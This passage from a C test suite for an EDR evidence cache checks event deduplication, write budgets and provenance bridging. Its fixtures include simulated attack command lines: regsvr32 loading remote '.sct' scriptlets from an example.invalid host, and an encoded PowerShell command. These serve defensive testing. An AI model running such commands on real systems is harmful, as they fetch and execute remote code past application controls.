    candidate.event_time_ns = base + 11000000LL + (int64_t)i * 1000000LL;
    candidate.process_start_key = UINT64_C(0x74103) + i;
    candidate.process_creation_filetime_100ns = UINT64_C(133700000000074103) + i;
    snprintf(candidate.event_id, sizeof(candidate.event_id), "budget-candidate-extra-%u", i);
    edr_local_evidence_cache_record_behavior(&candidate);
  }

  edr_local_evidence_cache_get_status(&status);
  assert(status.write_budget_limit == 8u);
  assert(status.write_budget_used == 16u);
  assert(status.write_budget_context_dropped >= 2u);
  assert(status.write_budget_candidate_dropped == 0u);
  assert(status.candidate_admitted == 6u);
  assert(status.candidate_rejected == 0u);

  edr_local_evidence_cache_close();
  test_unsetenv("EDR_EVIDENCE_CACHE_WRITE_BUDGET_PER_MIN");
  (void)remove(db);
  (void)remove("local_evidence_cache_write_budget.sqlite-wal");
  (void)remove("local_evidence_cache_write_budget.sqlite-shm");
}

/* A generation-less enrichment record and its later live-generation copy are
 * one source event only when their PID/type/atomic behavior matches inside the
 * short local reuse window.  The later copy must upgrade the durable row even
 * after context traffic has consumed its reserved half of the write budget. */
static void test_candidate_enrichment_reuses_stable_fallback_under_context_pressure(void) {
  const char *db = "local_evidence_cache_stable_enrichment.sqlite";
  struct timespec ts;
  EdrBehaviorRecord candidate;
  EdrBehaviorRecord pressure_candidate;
  EdrBehaviorRecord context;
  EdrEvidenceCacheStatus status;
  char candidate_id[160];
  int64_t base;

  (void)remove(db);
  (void)remove("local_evidence_cache_stable_enrichment.sqlite-wal");
  (void)remove("local_evidence_cache_stable_enrichment.sqlite-shm");
  test_setenv("EDR_EVIDENCE_CACHE_WRITE_BUDGET_PER_MIN", "6");
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  base = ((int64_t)ts.tv_sec / 60LL) * 60LL * 1000000000LL + 10000000000LL;
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);

  init_record(&candidate, EDR_EVENT_NET_CONNECT);
  candidate.priority = 3u;
  candidate.pid = 74103u;
  candidate.event_time_ns = base;
  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-stable-enrichment");
  snprintf(candidate.process_name, sizeof(candidate.process_name), "regsvr32.exe");
  snprintf(candidate.cmdline, sizeof(candidate.cmdline),
           "regsvr32.exe /s /n /u /i:https://example.invalid/p.sct scrobj.dll");
  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "198.51.100.103");
  candidate.net_dport = 443u;
  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
           "ENRICHMENT_ONLY");
  edr_local_evidence_cache_record_behavior(&candidate);

  candidate.event_time_ns = base + 800000000LL;
  candidate.evidence_revision = 2u;
  candidate.process_start_key = UINT64_C(0x74103);
  candidate.process_creation_filetime_100ns = UINT64_C(133700000000074103);
  snprintf(candidate.process_generation_source, sizeof(candidate.process_generation_source),
           "target_live_telemetry");
  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
           "CORRELATION_MISSING");
  edr_local_evidence_cache_record_behavior(&candidate);

  pressure_candidate = candidate;
  pressure_candidate.pid = 74104u;
  pressure_candidate.event_time_ns = base + 900000000LL;
  pressure_candidate.process_start_key = UINT64_C(0x74104);
  pressure_candidate.process_creation_filetime_100ns = UINT64_C(133700000000074104);
  snprintf(pressure_candidate.event_id, sizeof(pressure_candidate.event_id),
           "stable-enrichment-pressure");
  snprintf(pressure_candidate.process_name, sizeof(pressure_candidate.process_name),
           "powershell.exe");
  snprintf(pressure_candidate.cmdline, sizeof(pressure_candidate.cmdline),
           "powershell.exe -EncodedCommand QQ==");
  edr_local_evidence_cache_record_behavior(&pressure_candidate);

  context = pressure_candidate;
  context.priority = 1u;
  context.net_dport = 12345u;
  snprintf(context.process_name, sizeof(context.process_name), "telemetry.exe");
  snprintf(context.cmdline, sizeof(context.cmdline), "telemetry.exe --context");
  for (unsigned i = 0u; i < 4u; ++i) {
    context.event_time_ns = base + 1000000000LL + (int64_t)(i + 1u) * 1000000LL;
    snprintf(context.event_id, sizeof(context.event_id), "stable-context-%u", i);
    edr_local_evidence_cache_record_behavior(&context);
  }

  candidate.event_time_ns = base + 1200000000LL;
  candidate.evidence_revision = 3u;
  snprintf(candidate.process_generation_source, sizeof(candidate.process_generation_source),
           "target_live_telemetry_refresh");
  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness), "COMPLETE");
  edr_local_evidence_cache_record_behavior(&candidate);

  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 4u && status.candidate_reused == 2u);
  assert(status.candidate_admission_attempts == 2u && status.candidate_admitted == 2u);
  assert(status.write_budget_used == 6u);
  assert(status.write_budget_context_dropped >= 2u);
  assert(status.write_budget_candidate_dropped == 0u);
  assert(sqlite_table_count(db, "p0_candidates") == 2u);
  assert(sqlite_table_count(db, "artifacts") == 4u);

  edr_local_evidence_cache_close();
  sqlite_candidate_id_for_source_event(db, "", candidate_id, sizeof(candidate_id));
  sqlite_assert_candidate_enrichment(db, candidate_id, "", "475395",
                                      "target_live_telemetry_refresh", "COMPLETE");
  test_unsetenv("EDR_EVIDENCE_CACHE_WRITE_BUDGET_PER_MIN");
  (void)remove(db);
  (void)remove("local_evidence_cache_stable_enrichment.sqlite-wal");
  (void)remove("local_evidence_cache_stable_enrichment.sqlite-shm");
}

/* The no-event-id fallback is intentionally narrower than ordinary dedupe:
 * path is atomic evidence, unknown lifetimes do not merge, and an unknown to
 * known bridge expires after the observed enrichment skew. */
static void test_candidate_fallback_preserves_path_and_generation_boundaries(void) {
  const char *db = "local_evidence_cache_fallback_boundaries.sqlite";
  struct timespec ts;
  EdrBehaviorRecord base;
  EdrBehaviorRecord different_path;
  EdrBehaviorRecord unknown;
  EdrBehaviorRecord unknown_again;
  EdrBehaviorRecord late_known;
  EdrEvidenceCacheStatus status;
  int64_t now;

  (void)remove(db);
  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-wal");
  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-shm");
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);

  init_record(&base, EDR_EVENT_NET_CONNECT);
  base.priority = 3u;
  base.pid = 74105u;
  base.event_time_ns = now;
  base.process_start_key = UINT64_C(0x74105);
  base.process_creation_filetime_100ns = UINT64_C(133700000000074105);
  snprintf(base.endpoint_id, sizeof(base.endpoint_id), "ep-fallback-boundaries");
  snprintf(base.process_name, sizeof(base.process_name), "regsvr32.exe");
  snprintf(base.exe_path, sizeof(base.exe_path), "C:\\Temp\\a.exe");
  snprintf(base.cmdline, sizeof(base.cmdline), "regsvr32.exe /i:https://example.invalid/a.sct");
  snprintf(base.net_dst, sizeof(base.net_dst), "198.51.100.105");
  base.net_dport = 443u;
  edr_local_evidence_cache_record_behavior(&base);

  different_path = base;
  different_path.event_time_ns = now + 1000000LL;
  snprintf(different_path.exe_path, sizeof(different_path.exe_path), "C:\\Temp\\b.exe");
  edr_local_evidence_cache_record_behavior(&different_path);

  unknown = base;
  unknown.event_time_ns = now + 10000000000LL;
  unknown.process_start_key = 0u;
  unknown.process_creation_filetime_100ns = 0u;
  snprintf(unknown.exe_path, sizeof(unknown.exe_path), "C:\\Temp\\c.exe");
  edr_local_evidence_cache_record_behavior(&unknown);

  unknown_again = unknown;
  unknown_again.event_time_ns = now + 10001000000LL;
  edr_local_evidence_cache_record_behavior(&unknown_again);

  late_known = unknown;
  late_known.event_time_ns = now + 13000000000LL;
  late_known.process_start_key = UINT64_C(0x74106);
  late_known.process_creation_filetime_100ns = UINT64_C(133700000000074106);
  edr_local_evidence_cache_record_behavior(&late_known);

  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 5u && status.candidate_reused == 0u);
  assert(status.candidate_admitted == 5u && status.candidate_rejected == 0u);
  assert(sqlite_table_count(db, "p0_candidates") == 5u);
  edr_local_evidence_cache_close();
  (void)remove(db);
  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-wal");
  (void)remove("local_evidence_cache_fallback_boundaries.sqlite-shm");
}

static void test_candidate_known_to_unknown_keeps_generation_and_completeness(void) {
  const char *db = "local_evidence_cache_known_to_unknown.sqlite";
  struct timespec ts;
  EdrBehaviorRecord known;
  EdrBehaviorRecord unknown;
  EdrEvidenceCacheStatus status;
  char candidate_id[160];
  int64_t now;

  (void)remove(db);
  (void)remove("local_evidence_cache_known_to_unknown.sqlite-wal");
  (void)remove("local_evidence_cache_known_to_unknown.sqlite-shm");
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  init_record(&known, EDR_EVENT_NET_CONNECT);
  known.priority = 3u;
  known.pid = 74107u;
  known.event_time_ns = now;
  set_record_generation(&known, UINT64_C(0x74107));
  snprintf(known.endpoint_id, sizeof(known.endpoint_id), "ep-known-to-unknown");
  snprintf(known.process_name, sizeof(known.process_name), "regsvr32.exe");
  snprintf(known.exe_path, sizeof(known.exe_path), "C:\\Temp\\known.exe");
  snprintf(known.cmdline, sizeof(known.cmdline), "regsvr32.exe /i:https://example.invalid/k.sct");
  snprintf(known.net_dst, sizeof(known.net_dst), "198.51.100.107");
  known.net_dport = 443u;
  snprintf(known.process_generation_source, sizeof(known.process_generation_source),
           "target_live_telemetry");
  snprintf(known.source_completeness, sizeof(known.source_completeness),
           "CORRELATION_MISSING");
  edr_local_evidence_cache_record_behavior(&known);

  unknown = known;
  unknown.event_time_ns = now + 500000000LL;
  unknown.process_start_key = 0u;
  unknown.process_creation_filetime_100ns = 0u;
  unknown.process_generation_source[0] = '\0';
  snprintf(unknown.source_completeness, sizeof(unknown.source_completeness),
           "ENRICHMENT_ONLY");
  edr_local_evidence_cache_record_behavior(&unknown);

  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 2u && status.candidate_reused == 1u);
  assert(status.candidate_admitted == 1u && sqlite_table_count(db, "p0_candidates") == 1u);
  edr_local_evidence_cache_close();
  sqlite_candidate_id_for_source_event(db, "", candidate_id, sizeof(candidate_id));
  sqlite_assert_candidate_enrichment(db, candidate_id, "C:\\Temp\\known.exe", "475399",
                                      "target_live_telemetry", "CORRELATION_MISSING");
  (void)remove(db);
  (void)remove("local_evidence_cache_known_to_unknown.sqlite-wal");
  (void)remove("local_evidence_cache_known_to_unknown.sqlite-shm");
}

static void test_candidate_distinct_source_ids_bridge_only_known_to_unknown(void) {
  const char *db = "local_evidence_cache_cross_source_bridge.sqlite";
  struct timespec ts;
  EdrBehaviorRecord known;
  EdrBehaviorRecord unknown;
  EdrBehaviorRecord second_known;
  EdrBehaviorRecord unknown_first;
  EdrBehaviorRecord known_later;
  EdrEvidenceCacheStatus status;
  char candidate_id[160];
  char bundle[4096];
  int64_t now;

  (void)remove(db);
  (void)remove("local_evidence_cache_cross_source_bridge.sqlite-wal");
  (void)remove("local_evidence_cache_cross_source_bridge.sqlite-shm");
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  init_record(&known, EDR_EVENT_PROCESS_CREATE);
  known.priority = 3u;
  known.pid = 74109u;
  known.ppid = 400u;
  known.event_time_ns = now;
  set_record_generation(&known, UINT64_C(0x74109));
  snprintf(known.event_id, sizeof(known.event_id), "kernel-provider-source");
  snprintf(known.endpoint_id, sizeof(known.endpoint_id), "ep-cross-source-bridge");
  snprintf(known.process_name, sizeof(known.process_name), "powershell.exe");
  snprintf(known.image_path_canonical, sizeof(known.image_path_canonical),
           "C:\\Tools\\powershell.exe");
  snprintf(known.exe_path, sizeof(known.exe_path), "C:\\Tools\\powershell.exe");
  snprintf(known.cmdline, sizeof(known.cmdline),
           "powershell.exe -File C:\\Ops\\maint.ps1");
  snprintf(known.process_generation_source, sizeof(known.process_generation_source),
           "target_live_telemetry");
  snprintf(known.source_completeness, sizeof(known.source_completeness),
           "CORRELATION_MISSING");
  snprintf(known.detection_context, sizeof(known.detection_context),
           "{\"priority\":\"P1\"}");
  edr_local_evidence_cache_record_behavior(&known);

  unknown = known;
  unknown.event_time_ns = now + 500000000LL;
  unknown.process_start_key = 0u;
  unknown.process_creation_filetime_100ns = 0u;
  unknown.process_generation_source[0] = '\0';
  snprintf(unknown.event_id, sizeof(unknown.event_id), "security-provider-source");
  snprintf(unknown.source_completeness, sizeof(unknown.source_completeness),
           "ENRICHMENT_ONLY");
  edr_local_evidence_cache_record_behavior(&unknown);

  /* A second fully bound event with the same command is a distinct atomic
   * observation, even when the PID and generation happen to be identical. */
  second_known = known;
  second_known.event_time_ns = now + 750000000LL;
  snprintf(second_known.event_id, sizeof(second_known.event_id),
           "second-kernel-source");
  edr_local_evidence_cache_record_behavior(&second_known);

  /* Provider arrival order is not stable.  The same narrow bridge must also
   * preserve an initially generation-missing candidate when the authoritative
   * process copy arrives second. */
  unknown_first = known;
  unknown_first.pid = 74110u;
  unknown_first.event_time_ns = now + 1000000000LL;
  unknown_first.process_start_key = 0u;
  unknown_first.process_creation_filetime_100ns = 0u;
  unknown_first.process_generation_source[0] = '\0';
  snprintf(unknown_first.event_id, sizeof(unknown_first.event_id),
           "security-provider-first");
  snprintf(unknown_first.source_completeness,
           sizeof(unknown_first.source_completeness), "ENRICHMENT_ONLY");
  edr_local_evidence_cache_record_behavior(&unknown_first);

  known_later = unknown_first;
  known_later.event_time_ns = now + 1500000000LL;
  set_record_generation(&known_later, UINT64_C(0x74110));
  snprintf(known_later.process_generation_source,
           sizeof(known_later.process_generation_source),
           "target_live_telemetry");
  snprintf(known_later.event_id, sizeof(known_later.event_id),
           "kernel-provider-later");
  snprintf(known_later.source_completeness,
           sizeof(known_later.source_completeness), "CORRELATION_MISSING");
  edr_local_evidence_cache_record_behavior(&known_later);

  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 5u && status.candidate_reused == 2u);
  assert(status.candidate_admitted == 3u && status.candidate_rejected == 0u);
  assert(sqlite_table_count(db, "p0_candidates") == 3u);
  edr_local_evidence_cache_close();
  sqlite_candidate_id_for_source_event(db, "security-provider-source",
                                       candidate_id, sizeof(candidate_id));
  sqlite_bundle_manifest_for_source_event(db, "security-provider-source",
                                          bundle, sizeof(bundle));
  assert(strstr(bundle,
                "\"source_event_ids\":[\"kernel-provider-source\","
                "\"security-provider-source\"]") != NULL);
  sqlite_assert_candidate_enrichment(db, candidate_id, "C:\\Tools\\powershell.exe",
                                      "475401", "target_live_telemetry",
                                      "CORRELATION_MISSING");
  sqlite_candidate_id_for_source_event(db, "kernel-provider-later",
                                       candidate_id, sizeof(candidate_id));
  sqlite_bundle_manifest_for_source_event(db, "kernel-provider-later",
                                          bundle, sizeof(bundle));
  assert(strstr(bundle,
                "\"source_event_ids\":[\"security-provider-first\","
                "\"kernel-provider-later\"]") != NULL);
  sqlite_assert_candidate_enrichment(db, candidate_id, "C:\\Tools\\powershell.exe",
                                      "475408", "target_live_telemetry",
                                      "CORRELATION_MISSING");
  (void)remove(db);
  (void)remove("local_evidence_cache_cross_source_bridge.sqlite-wal");
  (void)remove("local_evidence_cache_cross_source_bridge.sqlite-shm");
}

static void init_cross_provider_process_pair(EdrBehaviorRecord *kernel,
                                             EdrBehaviorRecord *security,
                                             uint32_t pid, uint32_t ppid,
                                             int64_t now, uint64_t start_key) {
  assert(kernel != NULL && security != NULL);
  init_record(kernel, EDR_EVENT_PROCESS_CREATE);
  kernel->priority = 3u;
  kernel->pid = pid;
  kernel->ppid = ppid;
  kernel->event_time_ns = now;
  set_record_generation(kernel, start_key);
  snprintf(kernel->event_id, sizeof(kernel->event_id), "kproc-provider-%u", pid);
  snprintf(kernel->endpoint_id, sizeof(kernel->endpoint_id),
           "ep-cross-provider-ablation");
  snprintf(kernel->process_name, sizeof(kernel->process_name), "powershell.exe");
  snprintf(kernel->image_path_canonical, sizeof(kernel->image_path_canonical),
           "C:\\Tools\\powershell.exe");
  snprintf(kernel->exe_path, sizeof(kernel->exe_path), "C:\\Tools\\powershell.exe");
  snprintf(kernel->cmdline, sizeof(kernel->cmdline),
           "powershell.exe -File C:\\Ops\\controlled.ps1");
  snprintf(kernel->reg_source, sizeof(kernel->reg_source), "kproc");
  snprintf(kernel->reg_attribution, sizeof(kernel->reg_attribution), "process_id");
  snprintf(kernel->detection_context, sizeof(kernel->detection_context),
           "{\"priority\":\"P1\"}");
  snprintf(kernel->process_generation_source,
           sizeof(kernel->process_generation_source), "target_live_telemetry");
  snprintf(kernel->source_completeness, sizeof(kernel->source_completeness),
           "CORRELATION_MISSING");

  *security = *kernel;
  security->event_time_ns = now + 500000000LL;
  security->process_start_key = 0u;
  security->process_creation_filetime_100ns = 0u;
  security->process_generation_source[0] = '\0';
  snprintf(security->event_id, sizeof(security->event_id), "sec-provider-%u", pid);
  snprintf(security->reg_source, sizeof(security->reg_source), "sec");
  snprintf(security->source_completeness, sizeof(security->source_completeness),
           "ENRICHMENT_ONLY");
}

/* Ablation A: provider semantics are held equal. The Security copy resolves
 * through the process-tree snapshot, but only the Kernel-Process source
 * carries the raw tuple. Source-shape matching must use that raw fact. */
static void test_candidate_source_generation_presence_ablation(void) {
  const char *db = "local_evidence_cache_source_generation_ablation.sqlite";
  const uint32_t pid = 74111u;
  const uint32_t ppid = 4868u;
  const uint64_t start_key = UINT64_C(0x74111);
  struct timespec ts;
  EdrBehaviorRecord kernel, security;
  EdrEvidenceCacheStatus status;
  int64_t now;

  cleanup_test_sqlite_path(db);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(pid, ppid, "powershell.exe",
                        "powershell.exe -File C:\\Ops\\controlled.ps1",
                        "C:\\Tools\\powershell.exe", "powershell.exe",
                        (uint64_t)(now - 2000000000LL), start_key) == 0);
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  init_cross_provider_process_pair(&kernel, &security, pid, ppid, now, start_key);
  snprintf(security.reg_source, sizeof(security.reg_source), "kproc");
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_record_behavior(&security);
  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 2u && status.candidate_reused == 1u);
  assert(status.candidate_admitted == 1u);
  assert(status.candidate_dedup_source_shape_rejects == 0u);
  assert(sqlite_table_count(db, "p0_candidates") == 1u);
  edr_local_evidence_cache_close();
  edr_pt_cache_shutdown();
  cleanup_test_sqlite_path(db);
}

/* Ablation B: no process-tree snapshot exists, so the old source-shape check
 * already sees known/unknown. Differing sec/kproc provenance must not alter
 * the enrichment semantic identity. */
static void test_candidate_provider_provenance_semantic_ablation(void) {
  const char *db = "local_evidence_cache_provider_provenance_ablation.sqlite";
  const uint32_t pid = 74112u;
  const uint32_t ppid = 4868u;
  const uint64_t start_key = UINT64_C(0x74112);
  struct timespec ts;
  EdrBehaviorRecord kernel, security;
  EdrEvidenceCacheStatus status;
  int64_t now;

  cleanup_test_sqlite_path(db);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  init_cross_provider_process_pair(&kernel, &security, pid, ppid, now, start_key);
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_record_behavior(&security);
  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 2u && status.candidate_reused == 1u);
  assert(status.candidate_admitted == 1u);
  assert(status.candidate_dedup_semantic_mismatch_rejects == 0u);
  assert(sqlite_table_count(db, "p0_candidates") == 1u);
  edr_local_evidence_cache_close();
  edr_pt_cache_shutdown();
  cleanup_test_sqlite_path(db);
}

/* Combined real shape from ARM64 3.2.403: snapshot resolution and differing
 * provider provenance coexist. The two source ids must now converge on one
 * generation-bound candidate. */
static void test_candidate_cross_provider_snapshot_and_provenance_converge(void) {
  const char *db = "local_evidence_cache_cross_provider_combined.sqlite";
  const uint32_t pid = 74113u;
  const uint32_t ppid = 4868u;
  const uint64_t start_key = UINT64_C(0x74113);
  struct timespec ts;
  EdrBehaviorRecord kernel, security;
  EdrEvidenceCacheStatus status;
  char candidate_id[160];
  char bundle[4096];
  int64_t now;

  cleanup_test_sqlite_path(db);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(pid, ppid, "powershell.exe",
                        "powershell.exe -File C:\\Ops\\controlled.ps1",
                        "C:\\Tools\\powershell.exe", "powershell.exe",
                        (uint64_t)(now - 2000000000LL), start_key) == 0);
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  init_cross_provider_process_pair(&kernel, &security, pid, ppid, now, start_key);
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_record_behavior(&security);
  /* Replays from either provider must keep using the same aggregate slot after
   * that slot has observed both raw-generation shapes. */
  edr_local_evidence_cache_record_behavior(&security);
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 4u);
  assert(status.candidate_reused == 3u);
  assert(status.candidate_admitted == 1u && status.candidate_deduped == 3u);
  assert(status.candidate_dedup_generation_conflict_rejects == 0u);
  assert(status.candidate_dedup_source_shape_rejects == 0u);
  assert(status.candidate_dedup_semantic_mismatch_rejects == 0u);
  assert(status.candidate_dedup_skew_rejects == 0u);
  assert(sqlite_table_count(db, "p0_candidates") == 1u);
  sqlite_candidate_id_for_source_event(db, "kproc-provider-74113",
                                       candidate_id, sizeof(candidate_id));
  sqlite_bundle_manifest_for_source_event(db, "kproc-provider-74113",
                                          bundle, sizeof(bundle));
  assert(strstr(bundle,
                "\"source_event_ids\":[\"kproc-provider-74113\","
                "\"sec-provider-74113\"]") != NULL);
  sqlite_assert_candidate_enrichment(db, candidate_id, "C:\\Tools\\powershell.exe",
                                      "475411", "target_live_telemetry",
                                      "CORRELATION_MISSING");
  edr_local_evidence_cache_close();
  edr_pt_cache_shutdown();
  cleanup_test_sqlite_path(db);
}

static void test_candidate_dedupe_rejection_reason_observability(void) {
  const char *db = "local_evidence_cache_dedupe_reject_reasons.sqlite";
  const uint32_t ppid = 4868u;
  struct timespec ts;
  EdrBehaviorRecord kernel, security;
  EdrEvidenceCacheStatus status;
  char status_json[4096];
  char status_document[4160];
  int64_t now;

  cleanup_test_sqlite_path(db);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);

  /* Both sources carry the same raw tuple: not an enrichment pair. */
  init_cross_provider_process_pair(&kernel, &security, 74120u, ppid, now,
                                   UINT64_C(0x74120));
  set_record_generation(&security, UINT64_C(0x74120));
  snprintf(security.process_generation_source,
           sizeof(security.process_generation_source), "target_live_telemetry");
  snprintf(security.reg_source, sizeof(security.reg_source), "kproc");
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_record_behavior(&security);

  /* A true command difference remains a semantic boundary. */
  init_cross_provider_process_pair(&kernel, &security, 74121u, ppid,
                                   now + 1000000000LL, UINT64_C(0x74121));
  snprintf(security.cmdline, sizeof(security.cmdline),
           "powershell.exe -File C:\\Ops\\different.ps1");
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_record_behavior(&security);

  /* Same enrichment pair outside the two-second bridge remains distinct. */
  init_cross_provider_process_pair(&kernel, &security, 74122u, ppid,
                                   now + 2000000000LL, UINT64_C(0x74122));
  security.event_time_ns = kernel.event_time_ns + 3000000000LL;
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_record_behavior(&security);

  /* A conflicting bound lifetime is rejected independently of source shape. */
  init_cross_provider_process_pair(&kernel, &security, 74123u, ppid,
                                   now + 6000000000LL, UINT64_C(0x74123));
  set_record_generation(&security, UINT64_C(0x84123));
  snprintf(security.process_generation_source,
           sizeof(security.process_generation_source), "target_live_telemetry");
  snprintf(security.reg_source, sizeof(security.reg_source), "kproc");
  edr_local_evidence_cache_record_behavior(&kernel);
  edr_local_evidence_cache_record_behavior(&security);

  edr_local_evidence_cache_get_status(&status);
  assert(status.candidate_requests == 8u && status.candidate_reused == 0u);
  assert(status.candidate_admitted == 8u);
  assert(status.candidate_dedup_generation_conflict_rejects == 1u);
  assert(status.candidate_dedup_source_shape_rejects == 2u);
  assert(status.candidate_dedup_semantic_mismatch_rejects == 1u);
  assert(status.candidate_dedup_skew_rejects == 1u);
  assert(sqlite_table_count(db, "p0_candidates") == 8u);

  edr_local_evidence_cache_status_json(status_json, sizeof(status_json));
  assert((size_t)snprintf(status_document, sizeof(status_document), "{%s}", status_json) <
         sizeof(status_document));
  {
    cJSON *root = cJSON_Parse(status_document);
    cJSON *cache = root ? cJSON_GetObjectItemCaseSensitive(root, "evidence_cache") : NULL;
    cJSON *reasons = cache ? cJSON_GetObjectItemCaseSensitive(
                                 cache, "candidate_dedup_reject_reasons")
                           : NULL;
    cJSON *scope = reasons ? cJSON_GetObjectItemCaseSensitive(reasons, "scope") : NULL;
    cJSON *overlapping = reasons ? cJSON_GetObjectItemCaseSensitive(
                                       reasons, "overlapping")
                                 : NULL;
    cJSON *generation = reasons ? cJSON_GetObjectItemCaseSensitive(
                                      reasons, "generation_conflict")
                                : NULL;
    cJSON *source_shape = reasons ? cJSON_GetObjectItemCaseSensitive(
                                        reasons, "source_shape")
                                  : NULL;
    cJSON *semantic = reasons ? cJSON_GetObjectItemCaseSensitive(
                                    reasons, "semantic_mismatch")
                              : NULL;
    cJSON *skew = reasons ? cJSON_GetObjectItemCaseSensitive(reasons, "skew") : NULL;
    assert(root != NULL && cJSON_IsObject(cache) && cJSON_IsObject(reasons));
    assert(cJSON_IsString(scope) && scope->valuestring &&
           strcmp(scope->valuestring, "comparable_slot_checks") == 0);
    assert(cJSON_IsTrue(overlapping));
    assert(cJSON_IsNumber(generation) && generation->valuedouble == 1.0);
    assert(cJSON_IsNumber(source_shape) && source_shape->valuedouble == 2.0);
    assert(cJSON_IsNumber(semantic) && semantic->valuedouble == 1.0);
    assert(cJSON_IsNumber(skew) && skew->valuedouble == 1.0);
    cJSON_Delete(root);
  }

  edr_local_evidence_cache_close();
  edr_pt_cache_shutdown();
  cleanup_test_sqlite_path(db);
}

static void test_candidate_completeness_monotonically_upgrades(void) {
  const char *db = "local_evidence_cache_completeness.sqlite";
  struct timespec ts;
  EdrBehaviorRecord candidate;
  char candidate_id[160];
  int64_t now;

  (void)remove(db);
  (void)remove("local_evidence_cache_completeness.sqlite-wal");
  (void)remove("local_evidence_cache_completeness.sqlite-shm");
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  now = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  init_record(&candidate, EDR_EVENT_NET_CONNECT);
  candidate.priority = 3u;
  candidate.pid = 74108u;
  candidate.event_time_ns = now;
  snprintf(candidate.event_id, sizeof(candidate.event_id), "completeness-monotonic-source");
  snprintf(candidate.endpoint_id, sizeof(candidate.endpoint_id), "ep-completeness");
  snprintf(candidate.process_name, sizeof(candidate.process_name), "regsvr32.exe");
  snprintf(candidate.cmdline, sizeof(candidate.cmdline),
           "regsvr32.exe /i:https://example.invalid/completeness.sct");
  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "198.51.100.108");
  candidate.net_dport = 443u;
  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
           "ENRICHMENT_ONLY");
  snprintf(candidate.source_truncated_fields, sizeof(candidate.source_truncated_fields),
           "source.initial");
  edr_local_evidence_cache_record_behavior(&candidate);

  candidate.event_time_ns += 500000000LL;
  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
           "CORRELATION_MISSING");
  snprintf(candidate.source_truncated_fields, sizeof(candidate.source_truncated_fields),
           "source.correlation");
  edr_local_evidence_cache_record_behavior(&candidate);

  candidate.event_time_ns += 500000000LL;
  snprintf(candidate.source_completeness, sizeof(candidate.source_completeness),
           "ENRICHMENT_ONLY");
  snprintf(candidate.source_truncated_fields, sizeof(candidate.source_truncated_fields),
           "source.later_low_quality");
  edr_local_evidence_cache_record_behavior(&candidate);

  assert(sqlite_table_count(db, "p0_candidates") == 1u);
  edr_local_evidence_cache_close();
  sqlite_candidate_id_for_source_event(db, "completeness-monotonic-source",
                                       candidate_id, sizeof(candidate_id));
  sqlite_assert_candidate_completeness(db, candidate_id, "CORRELATION_MISSING",
                                       "source.correlation");
  (void)remove(db);
  (void)remove("local_evidence_cache_completeness.sqlite-wal");
  (void)remove("local_evidence_cache_completeness.sqlite-shm");
}

/* A rule id is classification metadata, not sufficient candidate identity.
 * Distinct source events under the same rule/PID must all commit; only a
 * repeat of one source event may use the local reuse slot. */
static void test_candidate_reuse_requires_generation_and_full_semantics(void) {
  const char *db = "local_evidence_cache_semantic_reuse.sqlite";
  struct timespec ts;
  EdrBehaviorRecord base;
  EdrEvidenceCacheStatus st;
  (void)remove(db);
  (void)remove("local_evidence_cache_semantic_reuse.sqlite-wal");
  (void)remove("local_evidence_cache_semantic_reuse.sqlite-shm");
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  init_record(&base, EDR_EVENT_NET_CONNECT);
